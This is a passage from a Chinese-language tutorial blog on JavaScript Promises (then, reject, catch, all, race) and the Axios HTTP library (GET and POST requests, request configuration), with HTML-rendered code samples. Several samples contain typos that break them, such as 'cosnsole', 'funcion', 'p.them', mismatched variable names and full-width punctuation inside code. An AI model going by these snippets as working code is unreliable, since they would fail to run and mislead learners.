class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs visual\"> 其实就是一个请求发出去以后，并不能马上获得需要的数据，因此整个js代码需要暂停等待请求数据的返回<br></code></pre></td></tr></table></figure>\n\n<p>Promise有三种状态：pending(等待态)，fulfiled(成功态)，rejected（失败态）；状态一旦改变就不会再变；创造promise实例后会立即执行；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-comment\">// 当参数a大于10且参数fn2是一个方法时 执行fn2</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">fn1</span>(<span class=\"hljs-params\">a, fn2</span>) &#123;<br>    <span class=\"hljs-keyword\">if</span> (a &gt; <span class=\"hljs-number\">10</span> &amp;&amp; <span class=\"hljs-keyword\">typeof</span> fn2 == <span class=\"hljs-string\">&#x27;function&#x27;</span>) &#123;<br>        <span class=\"hljs-title function_\">fn2</span>()<br>    &#125;<br>&#125;<br><span class=\"hljs-title function_\">fn1</span>(<span class=\"hljs-number\">11</span>, <span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;this is a callback&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>一般来说我们会碰到的回调嵌套都不会很多，一般就一到两级，但是某些情况下，回调嵌套很多时，代码就会非常繁琐，会给我们的编程带来很多的麻烦，这种情况俗称——回调地狱。</p>\n<p>这时候我们的promise就应运而生、粉墨登场了</p>\n<p>promise主要解决两个问题：</p>\n<ol>\n<li><p>回调地狱，代码难以维护，常常第一个函数的输出是第二个函数的输入；</p>\n</li>\n<li><p>支持多个并发请求，并从请求中获取数据；可以解决异步的问题；</p>\n<figure class=\"highlight plaintext\"><figcaption><span>basic</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs visual\">建议使用ES6箭头函数的编码方式，获得数据，处理数据，处理完成，下一步~<br></code></pre></td></tr></table></figure></li>\n</ol>\n<h4 id=\"2-promise用法\"><a href=\"#2-promise用法\" class=\"headerlink\" title=\"2.promise用法\"></a>2.promise用法</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> p=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-comment\">//一些异步操作</span><br>    <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Finished.&quot;</span>);<br>        <span class=\"hljs-title function_\">resolve</span>(<span class=\"hljs-string\">&quot;成功！&quot;</span>)；<br>    &#125;，<span class=\"hljs-number\">2000</span>)<br>&#125;)<br><br><span class=\"hljs-comment\">//promise的构造函数接受一个函数类型的参数，并且需要传入两个参数：</span><br>resolve：异步操作执行成功之后的回调函数；<br>reject：异步操作执行失败后的回调函数；<br></code></pre></td></tr></table></figure>\n\n<p>then 链式操作：</p>\n<p>表面上，promise只是简化层层回调，实质上，用维护状态、传递状态的方法使得回调函数能够及时调用；</p>\n<p>正确场景：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">p.<span class=\"hljs-title function_\">then</span>((data))=&gt;&#123;<br>    cosnsole.<span class=\"hljs-title function_\">log</span>(data);<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>)=&gt;</span>P&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);<br>        &#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-reject用法\"><a href=\"#3-reject用法\" class=\"headerlink\" title=\"3.reject用法\"></a>3.reject用法</h4><p>把promise的状态设置为rejected，这样在then中就能捕捉到，然后执行“失败”情况的回调；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> p=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>        <span class=\"hljs-keyword\">var</span> num=<span class=\"hljs-title class_\">Math</span>.<span class=\"hljs-title function_\">ceil</span>(<span class=\"hljs-title class_\">Math</span>.<span class=\"hljs-title function_\">random</span>()*<span class=\"hljs-number\">10</span>);<br>        <span class=\"hljs-keyword\">if</span>(num&lt;=<span class=\"hljs-number\">5</span>)<br>            &#123;<br>                <span class=\"hljs-title function_\">resolve</span>(num);<br>            &#125;<span class=\"hljs-keyword\">else</span><br>                &#123;<br>                    <span class=\"hljs-title function_\">reject</span>(<span class=\"hljs-string\">&quot;数字太大！&quot;</span>)；<br>                &#125;<br>    &#125;,<span class=\"hljs-number\">2000</span>);<br>&#125;)；<br>p.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Resolved&quot;</span>,data);<br>&#125;,<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Rejected&quot;</span>,err);<br>&#125;<br>      )<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-catch用法\"><a href=\"#4-catch用法\" class=\"headerlink\" title=\"4.catch用法\"></a>4.catch用法</h4><p>catch和then的第二个参数一样用来指定reject的回调；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">p.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Resolved&quot;</span>,data);<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Rejected&quot;</span>,err);\t\t\t<span class=\"hljs-comment\">//抛出异常</span><br>&#125;)<br><span class=\"hljs-comment\">//如果执行resolve的回调时，如果抛出异常，并不会报错停止js，而是进入到catch方法；</span><br>p.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>) =&gt;</span> &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;resolved&#x27;</span>,data);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(somedata); <span class=\"hljs-comment\">//此处的somedata未定义</span><br>&#125;)<br>.<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;rejected&#x27;</span>,err);<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"5-all的用法\"><a href=\"#5-all的用法\" class=\"headerlink\" title=\"5.all的用法\"></a>5.all的用法</h4><p>谁跑得慢，以谁为准执行回调；all接受一个数组参数，里面的值最终都算返回Promise对象；</p>\n<p>all方法提供了并行执行异步操作的能力，并且在所有异步操作执行完成之后才执行回调；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> <span class=\"hljs-title class_\">Promose1</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;)<br><span class=\"hljs-keyword\">let</span> <span class=\"hljs-title class_\">Promise2</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;)<br><span class=\"hljs-keyword\">let</span> <span class=\"hljs-title class_\">Promise3</span>=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;)<br><br><span class=\"hljs-keyword\">let</span> p=<span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([<span class=\"hljs-title class_\">Promise1</span>,<span class=\"hljs-title class_\">Promise2</span>,<span class=\"hljs-title class_\">Promise3</span>])<br><br>p.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>   \t<span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;三个都执行成功则成功&quot;</span>)<br>&#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;只要有失败则失败&quot;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<p>使用场景：一个游戏需要很多素材，只有所有素材都下载到本地之后，才开始初始化；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">let</span> video=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-title function_\">funcion</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;);<br><span class=\"hljs-keyword\">let</span> word=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">resolve,reject</span>)&#123;&#125;);<br><br><span class=\"hljs-keyword\">let</span> p=<span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([video,word]);<br><br>p.<span class=\"hljs-title function_\">them</span>(<span class=\"hljs-title function_\">funcion</span>(<span class=\"hljs-params\"></span>)&#123;<br>       <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;开始初始化！&quot;</span>);<br>       &#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>           <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;游戏初始化失败&quot;</span>)；<br>       &#125;)<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"6-race用法\"><a href=\"#6-race用法\" class=\"headerlink\" title=\"6.race用法\"></a>6.race用法</h4><p>谁跑的块，以谁为准执行回调；</p>\n<p>可以用race给某个异步请求设置超时时间，并且在超时后执行相应的操作，代码如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">requestImg</span>(<span class=\"hljs-params\"></span>)&#123;<br>\t<span class=\"hljs-keyword\">var</span> p = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">var</span> img =<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Img</span>();<br>        img.<span class=\"hljs-property\">onload</span>=<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>            <span class=\"hljs-title function_\">resolve</span>(img);<br>        &#125;<br>        img.<span class=\"hljs-property\">src</span>=<span class=\"hljs-string\">&#x27;img path&#x27;</span>;<br>    &#125;);<br>    <span class=\"hljs-keyword\">return</span> p;<br>&#125;<br><br><span class=\"hljs-comment\">//延时函数，用于计时</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">timeout</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">var</span> p=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>            <span class=\"hljs-title function_\">reject</span>(<span class=\"hljs-string\">&quot;请求图片超时！&quot;</span>);<br>        &#125;,<span class=\"hljs-number\">5000</span>);<br>    &#125;);<br>    <span class=\"hljs-keyword\">return</span> p;<br>&#125;<br><span class=\"hljs-comment\">//调用</span><br><span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">race</span>([<span class=\"hljs-title function_\">requestImg</span>(), <span class=\"hljs-title function_\">timeout</span>()]).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">data</span>) =&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data);<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> &#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(err);<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"二、基础定义Axios\"><a href=\"#二、基础定义Axios\" class=\"headerlink\" title=\"二、基础定义Axios\"></a>二、基础定义Axios</h3><h4 id=\"服务端它使用原生-node-js-http-模块-而在客户端-浏览端-则使用-XMLHttpRequests。\"><a href=\"#服务端它使用原生-node-js-http-模块-而在客户端-浏览端-则使用-XMLHttpRequests。\" class=\"headerlink\" title=\"服务端它使用原生 node.js http 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。\"></a>服务端它使用原生 node.js <code>http</code> 模块, 而在客户端 (浏览端) 则使用 XMLHttpRequests。</h4><h4 id=\"1-特性\"><a href=\"#1-特性\" class=\"headerlink\" title=\"1.特性\"></a>1.特性</h4><ul>\n<li>从浏览器创建 <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest\">XMLHttpRequests</a></li>\n<li>从 node.js 创建 <a href=\"http://nodejs.org/api/http.html\">http</a> 请求</li>\n<li>支持 <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise\">Promise</a> API</li>\n<li>拦截请求和响应</li>\n<li>转换请求和响应数据</li>\n<li>取消请求</li>\n<li>自动转换JSON数据</li>\n<li>客户端支持防御<a href=\"http://en.wikipedia.org/wiki/Cross-site_request_forgery\">XSRF</a></li>\n</ul>\n<h4 id=\"2-安装使用\"><a href=\"#2-安装使用\" class=\"headerlink\" title=\"2.安装使用\"></a>2.安装使用</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm install axios<br>//yarn<br> yarn add axios<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"Get请求\"><a href=\"#Get请求\" class=\"headerlink\" title=\"Get请求\"></a>Get请求</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> axios=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;axios&#x27;</span>);<br><br><span class=\"hljs-comment\">//向给定的ID用户发起请求</span><br>axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user?ID=12345&#x27;</span>).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;成功！&quot;</span>)<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;失败&quot;</span>);<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;总是执行的部分&quot;</span>);<br>&#125;)<br><br><span class=\"hljs-comment\">//以上代码可以等价于</span><br>axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">params</span>:&#123;<br>        <span class=\"hljs-attr\">ID</span>:<span class=\"hljs-number\">12345</span><br>    &#125;<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;成功！&quot;</span>)<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;失败&quot;</span>);<br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;总是执行的部分&quot;</span>);<br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"POST请求\"><a href=\"#POST请求\" class=\"headerlink\" title=\"POST请求\"></a>POST请求</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">axios.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;/user&#x27;</span>,&#123;<br>    <span class=\"hljs-attr\">fiestName</span>:<span class=\"hljs-string\">&#x27;Fred&#x27;</span>,<br>    <span class=\"hljs-attr\">lastName</span>:<span class=\"hljs-string\">&#x27;Smith&#x27;</span><br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">response</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(response);<br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(err);<br>&#125;);<br><br><span class=\"hljs-comment\">//多个POST请求</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">getUserAccount</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">getUserPermissions</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> axios.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/user/12345/permissions&#x27;</span>);<br>&#125;<br><br><span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([<span class=\"hljs-title function_\">getUserAccount</span>(),<span class=\"hljs-title function_\">getUserPermissions</span>()]).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">results</span>)&#123;<br>    <span class=\"hljs-keyword\">const</span> acct=results[<span class=\"hljs-number\">0</span>];<br>    <span class=\"hljs-keyword\">const</span> perm=results[<span class=\"hljs-number\">1</span>];<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"3-Axops-API\"><a href=\"#3-Axops-API\" class=\"headerlink\" title=\"3.Axops API\"></a>3.Axops API</h4><p>可以向 <code>axios</code> 传递相关配置来创建请求</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//发起一个post请求</span><br><span class=\"hljs-title function_\">axios</span>(&#123;<br>\t<span class=\"hljs-attr\">method</span>:<span class=\"hljs-string\">&#x27;post&#x27;</span>,<br>    <span class=\"hljs-attr\">url</span>:<span class=\"hljs-string\">&#x27;/user/12345&#x27;</span>,<br>    <span class=\"hljs-attr\">data</span>:&#123;<br>        <span class=\"hljs-attr\">firstname</span>:<span class=\"hljs-string\">&#x27;Martin&#x27;</span>,<br>        <span class=\"hljs-attr\">lastname</span>:<span class=\"hljs-string\">&#x27;Smith&#x27;</span><br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//在nodeJS用GET请求远程图片</span><br><span class=\"hljs-title function_\">axios</span>(&#123;<br>    <span class=\"hljs-attr\">method</span>:<span class=\"hljs-string\">&#x27;get&#x27;</span>,<br>    <span class=\"hljs-attr\">url</span>:<span class=\"hljs-string\">&#x27;http://test/123&#x27;</span>,<br>    <span class=\"hljs-attr\">responseType</span>:<span class=\"hljs-string\">&#x27;stream&#x27;</span><br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">response</span>)=&gt;</span>&#123;<br>    response.<span class=\"hljs-property\">data</span>.<span class=\"hljs-title function_\">pipe</span>(fs.<span class=\"hljs-title function_\">createWriteStream</span>(<span class=\"hljs-string\">&#x27;test.jpg&#x27;</span>));<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-请求配置\"><a href=\"#4-请求配置\" class=\"headerlink\" title=\"4.请求配置\"></a>4.请求配置</h4><p>创建请求时可以用配置选项；只有url是必须的，如果没有指定method，则默认使用GET；</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span 